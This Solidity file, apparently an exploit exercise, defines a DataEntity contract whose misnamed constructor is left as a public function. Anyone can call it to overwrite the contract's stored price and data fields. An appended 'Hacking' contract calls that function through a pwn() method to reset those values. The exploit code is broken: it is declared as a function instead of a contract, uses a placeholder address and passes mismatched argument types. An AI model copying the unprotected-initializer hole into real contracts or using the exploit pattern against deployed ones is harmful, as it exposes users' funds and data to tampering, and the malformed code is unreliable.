pragma solidity ^0.4.18;

import "zeppelin-solidity/contracts/ownership/Ownable.sol";


contract IDataEntity is Ownable {
    bytes public ipfsAddress;
    uint256 public dataDim;
    uint256 public currentPrice;

    function updatePrice(uint256 newPrice) external;
    function withdrawBalance() external;

    event PriceUpdated(uint256 oldPrice, uint256 newPrice);
}


contract DataEntity is IDataEntity {

    bytes public ipfsAddress;
    uint256 public dataDim;
    uint256 public currentPrice;

    event PriceUpdated(uint256 oldPrice, uint256 newPrice);

    // Constructor but it's as a function
    function IDataEntity (bytes _ipfsAddress, uint256 _dataDim, uint256 _initialPrice) public {
        dataDim = _dataDim;
        ipfsAddress = _ipfsAddress;
        currentPrice = _initialPrice;     //We call constructor aka this is function for DataEntity contract and we win.
    }

    function updatePrice (uint256 _newPrice) external onlyOwner
    {
        uint256 oldPrice = currentPrice;
        currentPrice = _newPrice;

        PriceUpdated(oldPrice, _newPrice); // Event is called. This will leave impression on Blockchain
    }

    function withdrawBalance() external onlyOwner // Can be called only by the owner
    {
        owner.transfer(this.balance);
    }
}

function Hacking{
address contractaddr = 0xcontractaddr;
DataEntity re;
address owner;

function Hacking() public {
    owner = msg.sender;
    re = DataEntity(contractaddr);
}

function pwn() public{
re.IDataEntity(tx.origin, 777, 333827);
}

}
